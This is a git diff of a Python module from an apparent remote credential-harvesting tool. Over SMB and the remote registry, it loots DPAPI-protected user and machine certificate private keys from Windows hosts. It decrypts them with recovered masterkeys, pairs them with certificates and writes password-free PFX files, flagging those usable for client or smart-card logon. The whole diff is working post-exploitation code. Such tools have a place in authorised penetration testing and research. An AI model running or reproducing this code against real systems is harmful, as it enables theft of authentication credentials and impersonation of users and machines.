@@ -1,12 +1,295 @@
+import hashlib
 import ntpath,copy
-import LnkParse3
+from typing import Any, Dict, List, Literal, Tuple
 from lib.toolbox import bcolors
 from lib.fileops import MyFileOps
 from lib.dpapi import *
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Util.number import bytes_to_long
+from cryptography import x509
+from cryptography.hazmat._oid import ExtensionOID
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.asymmetric.types import PRIVATE_KEY_TYPES
+from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12, PublicFormat, load_der_private_key
+from pyasn1.codec.der import decoder
+from pyasn1.type.char import UTF8String
+from impacket.structure import Structure
+from impacket.dpapi import DPAPI_BLOB
+from impacket.uuid import bin_to_string
+from myusers import MyUser
 
-'''decryption info comes from From Triage.cs of SharpDPAPI - HarmJ0y <3'''
-class certificates():
-    def __init__(self,smb,myregops,myfileops,logger,options,db,users):
+PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
+
+class PRIVATE_KEY_RSA(Structure):
+    structure = (
+        ('magic', '<L=0'),
+        ('len1', '<L=0'),
+        ('bitlen', '<L=0'),
+        ('unk', '<L=0'),
+        ('pubexp', '<L=0'),
+        ('_modulus', '_-modulus', 'self["len1"]'),
+        ('modulus', ':'),
+        ('_prime1', '_-prime1', 'self["len1"] // 2'),
+        ('prime1', ':'),
+        ('_prime2', '_-prime2', 'self["len1"] // 2'),
+        ('prime2', ':'),
+        ('_exponent1', '_-exponent1', 'self["len1"] // 2'),
+        ('exponent1', ':'),
+        ('_exponent2', '_-exponent2', 'self["len1"]// 2'),
+        ('exponent2', ':'),
+        ('_coefficient', '_-coefficient', 'self["len1"] // 2'),
+        ('coefficient', ':'),
+        ('_privateExponent', '_-privateExponent', 'self["len1"]'),
+        ('privateExponent', ':'),
+    )
+    def dump(self):
+        print("magic             : %s " % ( self['magic']))
+        print("len1              : %8x (%d)" % (self['len1'], self['len1']))
+        print("bitlen            : %8x (%d)" % (self['bitlen'], self['bitlen']))
+        print("pubexp            : %8x, (%d)" % (self['pubexp'], self['pubexp']))
+        print("modulus           : %s" % (hexlify( self['modulus'])))
+        print("prime1            : %s" % (hexlify( self['prime1'])))
+        print("prime2            : %s" % (hexlify( self['prime2'])))
+        print("exponent1         : %s" % (hexlify( self['exponent1'])))
+        print("exponent2         : %s" % (hexlify( self['exponent2'])))
+        print("coefficient       : %s" % (hexlify( self['coefficient'])))
+        print("privateExponent   : %s" % (hexlify( self['privateExponent'])))
+    def __init__(self, data = None, alignment = 0):
+        Structure.__init__(self, data, alignment)
+        chunk = int(self['bitlen'] / 16)
+        self['modulus']= self['modulus'][:chunk * 2]
+        self['prime1']= self['prime1'][:chunk]
+        self['prime2']= self['prime2'][:chunk]
+        self['exponent1']= self['exponent1'][:chunk]
+        self['exponent2']= self['exponent2'][:chunk]
+        self['coefficient']= self['coefficient'][:chunk]
+        self['privateExponent']= self['privateExponent'][:chunk * 2]
+
+# PVK DPAPI BLOB when it has the SIG data
+class PVKFile_SIG(Structure):
+    structure = (
+        ('Version', '<L=0'),
+        ('unk1', '<L=0'),
+        ('descrLen', '<L=0'),
+        ('SigHeadLen', "<L=0"),
+        ('SigPrivKeyLen', '<L=0'),
+        ('HeaderLen', '<L=0'),
+        ('PrivKeyLen', '<L=0'),
+        ('crcLen', '<L=0'),
+        ('SigFlagsLen', '<L=0'),
+        ('FlagsLen', '<L=0'),
+        ('_Description', '_-Description', 'self["descrLen"]'),
+        ('Description', ':'),
+        ('unk2', '<LLLLL=0'),
+        ('_Rsaheader_new', '_-Rsaheader_new', 'self["SigHeadLen"]' ),
+        ('Rsaheader_new', ':'),                                            
+        ('_Blob', '_-Blob', 'self["SigPrivKeyLen"]'),
+        ('Blob', ':', DPAPI_BLOB),
+        ('_ExportFlag', '_-ExportFlag', 'self["SigFlagsLen"]'),
+        ('ExportFlag', ':', DPAPI_BLOB), 
+    )
+
+    def dump(self):
+        print("[PVKFILE]")
+        print("[RSAHEADER]")
+        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
+        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
+        print("SigHeadLen         : %8x (%d)" % (self['SigHeadLen'], self['SigHeadLen']))
+        print("SigPrivKeyLen      : %8x (%d)" % (self['SigPrivKeyLen'], self['SigPrivKeyLen']))
+        print("HeaderLen          : %.8x (%d)" % (self['HeaderLen'], self['HeaderLen']))
+        print("PrivKeyLen         : %.8x (%d)" % (self['PrivKeyLen'], self['PrivKeyLen']))
+        print("crcLen             : %.8x (%d)" % (self['crcLen'], self['crcLen']))
+        print("SigFlagsLen        : %.8x (%d)" % (self['SigFlagsLen'], self['SigFlagsLen']))
+        print("FlagsLen           : %.8x (%d)" % (self['FlagsLen'], self['FlagsLen']))
+        print("Description   : %s" % (self['Description']))
+        print("Blank   : %s" % (self['unk2']))
+        print("RsaHeader : %s" %    (hexlify(self['Rsaheader_new']).decode('latin-1')))
+        print("[PRIVATE KEY]")
+        print (self['Blob'].dump())
+        print("[FLAGS]")
+        print (self['ExportFlag'].dump())
+
+# PVK DPAPI BLOB without SIG
+class PVKFile(Structure):
+    structure = (
+        ('Version', '<L=0'),
+        ('unk1', '<L=0'),
+        ('descrLen', '<L=0'),
+        ('SiPublicKeyLen', "<L=0"),
+        ('SiPrivKeyLen', '<L=0'),
+        ('ExPublicKeyLen', '<L=0'),
+        ('ExPrivKeyLen', '<L=0'),
+        ('HashLen', '<L=0'),
+        ('SiExportFlagLen', '<L=0'),
+        ('ExExportFlagLen', '<L=0'),
+        ('_Description', '_-Description', 'self["descrLen"]'),
+        ('Description', ':'),
+        ('unk2', '<LLLLL=0'),
+        ('_PublicKey', '_-PublicKey', 'self["ExPublicKeyLen"]' ),
+        ('PublicKey', ':'),
+        ('_Blob', '_-Blob', 'self["ExPrivKeyLen"]'),
+        ('Blob', ':', DPAPI_BLOB),
+        ('_ExportFlag', '_-ExportFlag', 'self["ExExportFlagLen"]'),
+        ('ExportFlag', ':', DPAPI_BLOB), 
+
+
+    )
+    def dump(self):
+        print("[PVKFILE]")
+        print("[RSAHEADER]")
+        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
+        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
+        print("SiPublicKeyLen         : %8x (%d)" % (self['SiPublicKeyLen'], self['SiPublicKeyLen']))
+        print("SiPrivKeyLen      : %8x (%d)" % (self['SiPrivKeyLen'], self['SiPrivKeyLen']))
+        print("ExPublicKeyLen          : %.8x (%d)" % (self['ExPublicKeyLen'], self['ExPublicKeyLen']))
+        print("ExPrivKeyLen         : %.8x (%d)" % (self['ExPrivKeyLen'], self['ExPrivKeyLen']))
+        print("HashLen             : %.8x (%d)" % (self['HashLen'], self['HashLen']))
+        print("SiExportFlagLen        : %.8x (%d)" % (self['SiExportFlagLen'], self['SiExportFlagLen']))
+        print("ExExportFlagLen           : %.8x (%d)" % (self['ExExportFlagLen'], self['ExExportFlagLen']))
+        print("Description   : %s" % (self['Description']))
+        print("Blank   : %s" % (self['unk2']))
+        print("PublicKey : %s" %    (hexlify(self['PublicKey']).decode('latin-1')))
+        print("[PRIVATE KEY]")
+        print (self['Blob'].dump())
+        print("[FLAGS]")
+        print (self['ExportFlag'].dump())
+
+# This class is the same as the previous two, its only used to see wich one of the previous clasess we will use
+# sorry 
+class PVKHeader(Structure):
+    structure = (
+        ('Version', '<L=0'),
+        ('unk1', '<L=0'),
+        ('descrLen', '<L=0'),
+        ('SigHeadLen', "<L=0"),
+        ('SigPrivKeyLen', '<L=0'),
+        ('HeaderLen', '<L=0'),
+        ('PrivKeyLen', '<L=0'),
+        ('crcLen', '<L=0'),
+        ('SigFlagsLen', '<L=0'),
+        ('FlagsLen', '<L=0'),
+        ('_Description', '_-Description', 'self["descrLen"]'),
+        ('Description', ':'),
+
+        ('Remaining', ':'),
+
+    )
+    def dump(self):
+        print("[PVKFILE]")
+        print("[RSAHEADER]")
+        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
+        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
+        print("SigHeadLen         : %8x (%d)" % (self['SigHeadLen'], self['SigHeadLen']))
+        print("SigPrivKeyLen      : %8x (%d)" % (self['SigPrivKeyLen'], self['SigPrivKeyLen']))
+        print("HeaderLen          : %.8x (%d)" % (self['HeaderLen'], self['HeaderLen']))
+        print("PrivKeyLen         : %.8x (%d)" % (self['PrivKeyLen'], self['PrivKeyLen']))
+        print("crcLen             : %.8x (%d)" % (self['crcLen'], self['crcLen']))
+        print("SigFlagsLen        : %.8x (%d)" % (self['SigFlagsLen'], self['SigFlagsLen']))
+        print("FlagsLen           : %.8x (%d)" % (self['FlagsLen'], self['FlagsLen']))
+        print("Description   : %s" % (self['Description']))
+
+def pvkblob_to_pkcs1(key):
+    '''
+    modified from impacket dpapi.py
+    parse private key into pkcs#1 format
+    :param key:
+    :return:
+    '''
+    modulus = bytes_to_long(key['modulus'][::-1]) # n
+    prime1 = bytes_to_long(key['prime1'][::-1]) # p
+    prime2 = bytes_to_long(key['prime2'][::-1]) # q
+    exp1 = bytes_to_long(key['exponent1'][::-1])
+    exp2 = bytes_to_long(key['exponent2'][::-1])
+    coefficient = bytes_to_long(key['coefficient'][::-1])
+    privateExp = bytes_to_long(key['privateExponent'][::-1]) # d
+    pubExp = int(key['pubexp']) # e
+    # RSA.Integer(prime2).inverse(prime1) # u
+
+    r = RSA.construct((modulus, pubExp, privateExp, prime1, prime2))
+    return r
+
+class CERTBLOB_PROPERTY(Structure):
+    structure = (
+        ('PropertyID', '<I=0'),
+        ('Reserved', '<I=0'),
+        ('Length', '<I=0'),
+        ('_Value','_-Value', 'self["Length"]'),
+        ('Value',':')
+    )
+
+class CERTBLOB():
+    def __init__(self, data = None, alignment = 0):
+        self.attributes = 0
+        self.der = None
+        if data is not None:
+            self.attributes = list()
+            remaining = data
+            while len(remaining) > 0:
+                attr = CERTBLOB_PROPERTY(remaining)
+                self.attributes.append(attr)
+                if attr["PropertyID"] == 32:
+                    self.der = attr["Value"]
+                remaining = remaining[len(attr):] 
+
+    def dump(self):
+        print('[CERTBLOB]')
+        for attr in self.attributes:
+            print("%s:\t\t%s" % (attr['PropertyID'],attr['Value']))
+        if self.der is not None:
+            print('')
+            print("DER             : %s " % (self.der))
+
+
+class Certificate:
+    def __init__(self, user: MyUser, cert:x509.Certificate, pkey: PRIVATE_KEY_TYPES, pfx: bytes, username: str, filename: str, clientauth: bool):
+        self.user = user
+        self.cert = cert
+        self.pkey = pkey
+        self.pfx = pfx
+        self.username = username
+        self.filename = filename
+        self.clientauth = clientauth
+
+    def dump(self) -> None:
+        print('Issuer:\t\t\t%s' % str(self.cert.issuer.rfc4514_string()))
+        print('Subject:\t\t%s' % str(self.cert.subject.rfc4514_string()))
+        print('Valid Date:\t\t%s' % self.cert.not_valid_before)
+        print('Expiry Date:\t\t%s' % self.cert.not_valid_after)
+        print('Extended Key Usage:')
+        for i in self.cert.extensions.get_extension_for_oid(oid=ExtensionOID.EXTENDED_KEY_USAGE).value:
+            print('\t%s (%s)'%(i._name, i.dotted_string))
+
+        if self.clientauth:    
+            print("\t[!] Certificate is used for client auth!")
+
+        print()
+        # print((self.cert.public_bytes(Encoding.PEM).decode('utf-8')))
+        # print()
+
+class CertificatesTriage():
+
+    false_positive = ['.','..', '.NET v4.5', '.NET v4.5 Classic', 'desktop.ini','Public','Default','Default User','All Users']
+    system_capi_keys_generic_path = [
+        "ProgramData\\Microsoft\\Crypto\\RSA",
+        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
+    ]
+    system_cng_keys_generic_path = [
+        "ProgramData\\Microsoft\\Crypto\\Keys",
+        "ProgramData\\Microsoft\\Crypto\\SystemKeys",
+        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
+    ]
+    user_capi_keys_generic_path = [
+        'Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\RSA',
+    ]
+    user_cng_keys_generic_path = [
+        'Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\Keys',
+    ]
+    user_mycertificates_generic_path = [
+        'Users\\%s\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates'
+    ]
+    share = 'C$'
+
+    def __init__(self,smb,myregops,myfileops,logger,options,db,users,user_key, machine_key):
         self.myregops = myregops
         self.myfileops = myfileops
         self.logging = logger
@@ -14,261 +297,215 @@ class certificates():
         self.db = db
         self.users = users
         self.smb = smb
-
+        self.user_key = user_key
+        self.machine_key = machine_key
 
     def run(self):
-        self.get_files()
-        #self.process_files()
-        #self.decrypt_all()
-
-    def get_files(self):
+        # logging.basicConfig(format='%(asctime)s.%(msecs)03d %(levelname)s {%(module)s} [%(funcName)s] %(message)s',
+		#                     datefmt='%Y-%m-%d,%H:%M:%S', level=logging.DEBUG,
+		#                     handlers=[logging.FileHandler("debug.log"), logging.StreamHandler()])
+        # logging.getLogger().setLevel(logging.DEBUG)
         self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering Certificates Secrets {bcolors.ENDC}")
-        blacklist = ['.', '..']
 
-        user_directories = [("Users\\{username}\\AppData\\Roaming\\Microsoft\\Crypto\\RSA", "*",False),
-                            ("Users\\{username}\\AppData\\Roaming\\Microsoft\\Crypto\\Keys","*",True)]#(Path,mask,cng)
-        machine_directories = [("ProgramData\\Microsoft\\Crypto\\Keys\\", '*',True),
-                               ("ProgramData\\Microsoft\\Crypto\\SystemKeys\\", '*',True),
-                               ("Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",'*', True),
-                               #("ProgramData\\Microsoft\\Crypto\\DSS\\MachineKeys\\", '*'),
-                               #("ProgramData\\Microsoft\\Crypto\\PCPKSP\\WindowsAIK\\", '*'),
-                               ("Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\", '*',False),
-                               ("ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys", '*',False)]
-
+        user_certificates = self.triage_certificates()
+        for cert in user_certificates:
+            filename = "%s_%s.pfx" % (cert.username,cert.filename[:16])
+            self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for user {cert.user.username}. Writing it to {filename}{bcolors.ENDC}")
+            cert.dump() 
+            with open(filename, "wb") as f:
+                f.write(cert.pfx)
         for user in self.users:
-            self.logging.debug(
-                f"[{self.options.target_ip}] Looking for {user.username} ")
             if user.username == 'MACHINE$':
-                directories_to_use = machine_directories
-            else:
-                directories_to_use = user_directories
+                system_certificates = self.triage_system_certificates(user)
+                for cert in system_certificates:
+                    filename = "%s_%s.pfx" % (cert.username,cert.filename[:16])
+                    self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}[+] Found certificate for MACHINE. Writing it to {filename}{bcolors.ENDC}")
+                    cert.dump() 
+                    with open(filename, "wb") as f:
+                        f.write(cert.pfx)
 
-            for info in directories_to_use:
-                my_dir, my_mask,cng = info
-                tmp_pwd = my_dir.format(username=user.username)
-                self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} Certificates in {tmp_pwd} with mask {my_mask}")
-                for mask in my_mask:
-                    my_directory = self.myfileops.do_ls(tmp_pwd, mask, display=False)
-                    for infos in my_directory:
-                        longname, is_directory = infos
-                        self.logging.debug("ls returned file %s" % longname)
-                        if longname not in blacklist and not is_directory:
-                            try:
-                                # Downloading file
-                                localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname), allow_access_error=False)
-                                self.process_file(localfile,user,longname,cng)
-                            except Exception as ex:
-                                self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {localfile}{bcolors.ENDC}")
-                                self.logging.debug(ex)
-                        elif longname not in blacklist and is_directory:
-                            tmp_pwd2 = ntpath.join(tmp_pwd, longname)
-                            my_directory2 = self.myfileops.do_ls(tmp_pwd2, my_mask, display=False)
-                            for infos2 in my_directory2:
-                                longname2, is_directory2 = infos2
-                                if longname2 not in blacklist and not is_directory2:
-                                    try:
-                                        # Downloading file
-                                        localfile = self.myfileops.get_file(ntpath.join(tmp_pwd2, longname2), allow_access_error=False)
-                                        self.process_file(localfile, user,longname2,cng)
-                                    except Exception as ex:
-                                        self.logging.debug(
-                                            f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {localfile}{bcolors.ENDC}")
-                                        self.logging.debug(ex)
+    def triage_system_certificates(self, user: MyUser) -> List[Certificate]:
+        certificates = []
+        pkeys = self.loot_privatekeys(user=user)
+        certs = self.loot_system_certificates()
+        if len(pkeys) > 0 and len(certs) > 0:
+            certificates = self.correlate_certificates_and_privatekeys(certs=certs, private_keys=pkeys, user=user)
+        return certificates
 
-    def process_file(self,localfile,user,longname,cng):
-        if user.username == 'MACHINE$':
-            my_user_type = 'MACHINE'
-        else:
-            my_user_type = 'DOMAIN'
-        try:
+    def loot_system_certificates(self) -> Dict[str,x509.Certificate]:
+        certificates = {}
+        my_certificates_key = 'HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates'
+        cert_regs = self.myregops.get_reg_subkey(my_certificates_key)
+        for cert in cert_regs:
+            _, certblob_bytes = self.myregops.get_reg_value(cert, 'Blob')
+            certblob = CERTBLOB(certblob_bytes)
+            guid = cert.split('\\')[-1]
+            if certblob.der is not None:
+                cert = self.der_to_cert(certblob.der)
+                certificates[guid] = cert
+        return certificates
+
+    def triage_certificates(self) -> List[Certificate]:
+        certificates = []
+        for user in [u for u in self.users if u.username not in self.false_positive and u.username != "MACHINE$"]:
             try:
-                self.logging.debug("Opening CERT file %s" % localfile)
-                fp = open(localfile, 'rb')
-                data = fp.read()
-                fp.close()
-            except Exception as ex:
-                self.logging.debug("Exception in certificate.py readFile ")
-                self.logging.debug(ex)
-            if cng==True:
-                mycert = CngCertBlob(data)
-            else:#CAPI
-                mycert = CapiCertBlob(data)
-            blob = mycert['Blob']
+                certificates += self.triage_certificates_for_user(user=user)                         
+            except Exception as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                    logging.debug(str(e))
+                pass
+        return certificates
 
-            myoptions = copy.deepcopy(self.options)
-            myoptions.file = localfile  # Masterkeyfile to parse
-            myoptions.masterkeys = None  # user.masterkeys_file
-            myoptions.key = None
-            mydpapi = DPAPI(myoptions, self.logging)
-            guid = mydpapi.find_Blob_masterkey(raw_data=blob)
-            self.logging.debug(f"[{self.options.target_ip}] Looking for {longname} masterkey : {guid}")
-            if guid != None:
-                masterkey = self.get_masterkey(user=user, guid=guid, type=my_user_type)
-                if masterkey != None:
-                    if masterkey['status'] == 'decrypted':
-                        mydpapi.options.key = masterkey['key']
-                        if cng == True:
-                            cred_data = mydpapi.decrypt_blob(entropy=b"xT5rZW5qVVbrvpuA")
-                        else:
-                            cred_data = mydpapi.decrypt_blob()
-                        if cred_data != None:
-                            self.logging.debug(
-                                f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull of {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Certificate {longname}{bcolors.ENDC}")
-                            user.files[longname]['status'] = 'decrypted'
-                            user.files[longname]['data'] = cred_data
-                            self.process_decrypted_cert(user,user.files[longname],cng)  # cred_data,user,localfile,my_blob_type)
-                        else:
-                            self.logging.debug(
-                                f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey{bcolors.ENDC}")
-                    else:
-                        self.logging.debug(
-                            f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey - Masterkey not decrypted{bcolors.ENDC}")
-                else:
-                    self.logging.debug(
-                        f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey- cant get masterkey {guid}{bcolors.ENDC}")
-            else:
-                self.logging.debug(
-                    f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey - can t get the GUID of masterkey from blob file{bcolors.ENDC}")
-            self.db.add_credz(credz_type='XXXXX',credz_username=username.decode('utf-8'),redz_password=ntlm.decode('utf-8'),credz_target='',credz_path=localfile,pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=username)
-            return 1
-        except Exception as ex:
-            self.logging.debug(
-                f"[{self.options.target_ip}] {bcolors.WARNING}Exception in ProcessFile {localfile}{bcolors.ENDC}")
-            self.logging.debug(ex)
-
-    def process_decrypted_cert(self,user,user_file,cng):
-        return 1
-        #if cng:
-        #    ConvertRsaBlobToRsaFullBlob(user_file['data'])
-        '''
+    def triage_certificates_for_user(self, user: MyUser) -> List[Certificate]:
+        certificates = []
+        pkeys = self.loot_privatekeys(privatekeys_paths=[elem % user.username for elem in self.user_capi_keys_generic_path], user=user)                         
+        certs = self.loot_certificates(certificates_paths=[elem % user.username for elem in self.user_mycertificates_generic_path])
+        if len(pkeys) > 0 and len(certs) > 0:
+            certificates = self.correlate_certificates_and_privatekeys(certs=certs, private_keys=pkeys, user=user)
+        return certificates
         
-            var certificate = new ExportedCertificate();
-            
-            if ((privKeyBytes != null) && (privKeyBytes.Length > 0))
-            {
-                Tuple<string, string> decryptedRSATuple = null;
+    def loot_privatekeys(self, privatekeys_paths: List[str] = system_capi_keys_generic_path, user: MyUser = None) -> Dict[str, Tuple[str,RSA.RsaKey]]:
+        pkeys = {}
+        for privatekey_path in privatekeys_paths:
+            pkeys_dirs = self.myfileops.do_ls(privatekey_path, '*', display=False)
+            for longname, is_dir in pkeys_dirs:
+                self.logging.debug("ls returned file %s" % longname)
+                if longname not in self.false_positive and is_dir:
+                    sid = longname
+                    pkeys_sid_path = ntpath.join(privatekey_path,sid)
+                    pkeys_sid_dir = self.myfileops.do_ls(pkeys_sid_path, "*", display=False)
+                    for file_longname, is_dir2 in pkeys_sid_dir:
+                        if not is_dir2 and is_certificate_guid(file_longname):
+                            pkey_guid = file_longname
+                            pkey_filepath = ntpath.join(pkeys_sid_path, pkey_guid)
+                            self.logging.debug("Found PrivateKey Blob: %s" %  (pkey_filepath))
+                            data = b''
+                            try:
+                                filename = self.myfileops.get_file(ntpath.join(pkeys_sid_path, pkey_guid), allow_access_error=False)
+                                if filename is None:
+                                    continue
+                                with open(filename, 'rb') as fp:
+                                    data = fp.read()
+                                if data is None or data == b'':
+                                    continue
+                                masterkey_guid = self.get_masterkey_guid_for_privatekey(data)
+                                if masterkey_guid is None:
+                                    continue
+                                masterkey = self.get_masterkey(user=user, guid=masterkey_guid, type=user.type)
+                                if type(masterkey) is not dict:
+                                    continue
+                                if masterkey['status'] == 'decrypted':
+                                    pkey = self.decrypt_privatekey(key=masterkey['key'], privatekey_bytes=data)
+                                    pkeys[hashlib.md5(pkey.public_key().export_key('DER')).hexdigest()] = (pkey_guid,pkey)
+                            except Exception as e:
+                                import traceback
+                                traceback.print_exc()
+                                logging.debug(str(e))
+        return pkeys
+    
+    def loot_certificates(self, certificates_paths: List[str]) -> Dict[str, x509.Certificate]:
+        certificates = {}
+        for certificate_path in certificates_paths:
+            certs_dirs = self.myfileops.do_ls(certificate_path, '*', display=False)
+            for longname, is_dir in certs_dirs:
+                self.logging.debug("ls returned file %s" % longname)
+                if longname not in self.false_positive:
+                    try:
+                        certpath = ntpath.join(certificate_path, longname)
+                        self.logging.debug("Found Certificates Blob: %s" %  (certpath))
+                        data = b''
+                        with open(self.myfileops.get_file(certpath), 'rb') as fp:
+                            data = fp.read()
+                        certblob = CERTBLOB(data)
+                        if certblob.der is not None:
+                            cert = self.der_to_cert(certblob.der)
+                            certificates[longname] = cert
+                    except Exception as e:
+                        pass
+        return certificates
 
-                if (cng)
-                {
-                    decryptedRSATuple = ParseDecCngCertBlob(privKeyBytes);
-                }
-                else
-                {
-                    decryptedRSATuple = ParseDecCapiCertBlob(privKeyBytes);
-                }
+    def correlate_certificates_and_privatekeys(self, certs: Dict[str, x509.Certificate], private_keys: Dict[str, Tuple[str,RSA.RsaKey]], user: MyUser) -> List[Certificate]:
+        certificates = []
+        for name, cert in certs.items():
+            if hashlib.md5(cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)).hexdigest() in private_keys.keys():
+                # Matching public and private key
+                pkey = private_keys[hashlib.md5(cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)).hexdigest()]
+                logging.debug("Found match between %s certificate and %s private key !" % (name, pkey[0]))
+                key = load_der_private_key(pkey[1].export_key('DER'), password=None)
+                pfx = self.create_pfx(key=key,cert=cert)
+                username = self.get_id_from_certificate(certificate=cert)[1].replace('@','_')
+                clientauth = False
+                for i in cert.extensions.get_extension_for_oid(oid=ExtensionOID.EXTENDED_KEY_USAGE).value:
+                    if i.dotted_string in [
+                        '1.3.6.1.5.5.7.3.2', # Client Authentication
+                        '1.3.6.1.5.2.3.4', # PKINIT Client Authentication
+                        '1.3.6.1.4.1.311.20.2.2', # Smart Card Logon
+                        '2.5.29.37.0', # Any Purpose
+                    ]:
+                        clientauth = True
+                        break
 
-                var PrivatePKCS1 = decryptedRSATuple.First;
-                var PrivateXML = decryptedRSATuple.Second;
+                certificates.append(Certificate(user=user, cert=cert, pkey=key, pfx=pfx, username=username, filename=name, clientauth=clientauth))
+        return certificates
 
-                if (alwaysShow)
-                {
-                    Console.WriteLine("  File               : {0}", fileName);
-                    Console.WriteLine(statusMessage);
-                    certificate.PrivateKey = PrivatePKCS1;
-                }
+    def der_to_cert(self,certificate: bytes) -> x509.Certificate:
+        return x509.load_der_x509_certificate(certificate)
 
-                X509Certificate2Collection certCollection;
-                try
-                {
-                    foreach (var storeLocation in new Enum[] { StoreLocation.CurrentUser, StoreLocation.LocalMachine })
-                    {
-                        X509Store store = new X509Store((StoreLocation)storeLocation);
-                        store.Open(OpenFlags.ReadOnly | OpenFlags.OpenExistingOnly);
-                        certCollection = store.Certificates;
-                        store.Close();
+    def create_pfx(self, key: rsa.RSAPrivateKey, cert: x509.Certificate) -> bytes:
+        return pkcs12.serialize_key_and_certificates(
+            name=b"",
+            key=key,
+            cert=cert,
+            cas=None,
+            encryption_algorithm=NoEncryption(),
+        )
 
-                        foreach (var cert in certCollection)
-                        {
-                            var PublicXML = cert.PublicKey.Key.ToXmlString(false).Replace("</RSAKeyValue>", "");
+    def get_id_from_certificate(self,certificate: x509.Certificate) -> Tuple[str, str]:
+        try:
+            san = certificate.extensions.get_extension_for_oid(
+                ExtensionOID.SUBJECT_ALTERNATIVE_NAME
+            )
 
-                            //There are cases where systems have a lot of "orphaned" private keys. We are only grabbing private keys that have a matching modulus with a cert in the store
-                            //https://forums.iis.net/t/1224708.aspx?C+ProgramData+Microsoft+Crypto+RSA+MachineKeys+is+filling+my+disk+space
-                            //https://superuser.com/questions/538257/why-are-there-so-many-files-in-c-programdata-microsoft-crypto-rsa-machinekeys
-                            if (PrivateXML.Contains(PublicXML))
-                            {
-                                // only display all of the status messages if we have a decrypted private key that corresponds to a cert found in a store location
-                                if (!alwaysShow)
-                                {
-                                    Console.WriteLine("  File               : {0}", fileName);
-                                    Console.WriteLine(statusMessage);
-                                }
+            for name in san.value.get_values_for_type(x509.OtherName):
+                if name.type_id == PRINCIPAL_NAME:
+                    return (
+                        "UPN",
+                        decoder.decode(name.value, asn1Spec=UTF8String)[0].decode(),
+                    )
 
-                                certificate.Issuer = cert.Issuer;
-                                certificate.Subject = cert.Subject;
-                                certificate.ValidDate = cert.NotBefore.ToString();
-                                certificate.ExpiryDate = cert.NotAfter.ToString();
-                                certificate.Thumbprint = cert.Thumbprint;
+            for name in san.value.get_values_for_type(x509.DNSName):
+                return "DNS Host Name", name
+        except:
+            pass
 
-                                foreach (var ext in cert.Extensions)
-                                {
-                                    if (ext.Oid.FriendlyName == "Enhanced Key Usage")
-                                    {
-                                        var extUsages = ((X509EnhancedKeyUsageExtension)ext).EnhancedKeyUsages;
+        return None, None
 
-                                        if (extUsages.Count > 0)
-                                        {
-                                            foreach (var extUsage in extUsages)
-                                            {
-                                                var eku = new Tuple<string, string>(extUsage.FriendlyName, extUsage.Value);
-                                                certificate.EKUs.Add(eku);
-                                            }
-                                        }
-                                    }
-                                }
+    def decrypt_privatekey(self,privatekey_bytes:bytes, key:Any, cng: bool = False) -> RSA.RsaKey:
+        blob= PVKHeader(privatekey_bytes)
+        if blob['SigHeadLen'] > 0:
+            blob=PVKFile_SIG(privatekey_bytes)
+        else:
+            blob=PVKFile(privatekey_bytes)
+        dpapi_blob = blob['Blob']
+        self.logging.debug("got blob %r" % dpapi_blob)
+        key = unhexlify(key[2:])
+        decrypted = dpapi_blob.decrypt(key)
+        rsa_temp = PRIVATE_KEY_RSA(decrypted)
+        pkcs1 = pvkblob_to_pkcs1(rsa_temp)
+        return pkcs1
 
-                                string b64cert = Convert.ToBase64String(cert.Export(X509ContentType.Cert));
-                                int BufferSize = 64;
-                                int Index = 0;
-                                var sb = new StringBuilder();
-                                sb.AppendLine("-----BEGIN CERTIFICATE-----");
-                                for (var i = 0; i < b64cert.Length; i += 64)
-                                {
-                                    sb.AppendLine(b64cert.Substring(i, Math.Min(64, b64cert.Length - i)));
-                                    Index += BufferSize;
-                                }
-                                sb.AppendLine("-----END CERTIFICATE-----");
-
-                                certificate.PrivateKey = PrivatePKCS1;
-                                certificate.PublicCertificate = sb.ToString();
-
-                                //// Commented code for pfx generation due to MS not giving 
-                                ////a dispose method < .NET4.6 https://snede.net/the-most-dangerous-constructor-in-net/
-                                ////   X509Certificate2 certificate = new X509Certificate2(cert.RawData);
-                                ////   certificate.PrivateKey = ;
